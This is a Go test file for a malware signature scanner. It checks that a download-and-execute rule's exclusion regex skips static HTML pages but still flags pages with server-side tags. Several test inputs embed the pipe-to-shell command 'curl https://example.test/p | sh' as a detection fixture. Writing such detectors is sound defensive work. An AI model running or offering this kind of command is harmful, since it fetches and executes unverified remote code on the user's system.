package signatures

import (
	"fmt"
	"strings"
	"testing"
)

func staticPageRule(t testing.TB) Rule {
	t.Helper()
	s := NewScanner("../../configs")
	if err := s.LoadError(); err != nil {
		t.Fatal(err)
	}
	for _, rule := range s.rules {
		if rule.Name == "dropper_wget_exec" {
			return rule
		}
	}
	t.Fatal("download rule missing")
	return Rule{}
}

// Exclusions run before detection, including for files without a command.
// Assert the exclusion itself so the rule's comment filter cannot mask a miss.
func TestStaticPageExclusion(t *testing.T) {
	rule := staticPageRule(t)
	if len(rule.compiledExcludeRegexes) != 1 {
		t.Fatal("expected one static page exclusion")
	}
	re := rule.compiledExcludeRegexes[0]
	for _, prefix := range []string{"<html>", "<!DOCTYPE html>", "\xef\xbb\xbf \r\n\t<html>"} {
		for _, body := range []string{"plain text", "<!-- comment -->", "<!<p>text</p>", "<!-<p>", "<!--<p>", "<<<p>", "<script>let x = 1;</script>"} {
			t.Run(prefix+body, func(t *testing.T) {
				if !re.MatchString(prefix + body) {
					t.Error("static content not excluded")
				}
			})
		}
		for _, tag := range []string{"<?", "<?PHP", "<?=", "<%", "<!--#", "<", "<!", "<!-", "<!--"} {
			t.Run(prefix+tag, func(t *testing.T) {
				if re.MatchString(prefix + "<code>curl https://example.test/p | sh</code>" + tag) {
					t.Error("server tag or incomplete tag was excluded")
				}
			})
		}
	}
	for _, tag := range []string{"<?", "<%", "<!--#"} {
		for _, before := range []string{"", "<", "<!", "<!-", "<!--", "<!<"} {
			if re.MatchString("<html>" + before + tag + "code</html>") {
				t.Errorf("overlapping server tag %q was excluded", before+tag)
			}
		}
	}
}

func TestStaticPageDownloadAllExtensions(t *testing.T) {
	rule := staticPageRule(t)
	s := &Scanner{rules: []Rule{rule}}
	for _, ext := range []string{".html", ".php", ".sh", ".txt", ".bin", ""} {
		for _, tail := range []string{"", "<?", "<%", "<!--#", "<", "<!", "<!-", "<!--"} {
			content := []byte("<html><code>curl https://example.test/p | sh</code>" + tail)
			if got := hasRule(s.ScanContent(content, ext), rule.Name); got != (tail != "") {
				t.Errorf("extension %q, tail %q: match = %t", ext, tail, got)
			}
		}
	}
}

func BenchmarkStaticPageExclusion(b *testing.B) {
	rule := staticPageRule(b)
	re := rule.compiledExcludeRegexes[0]
	for _, size := range []int{1 << 16, 1 << 20} {
		for _, body := range []string{"text ", "<!<", "<p>x</p>"} {
			data := []byte("<html>" + strings.Repeat(body, size/len(body)) + "</html>")
			b.Run(fmt.Sprintf("%d/%s", size, body), func(b *testing.B) {
				b.SetBytes(int64(len(data)))
				b.ReportAllocs()
				for b.Loop() {
					re.Match(data)
				}
			})
		}
	}
}
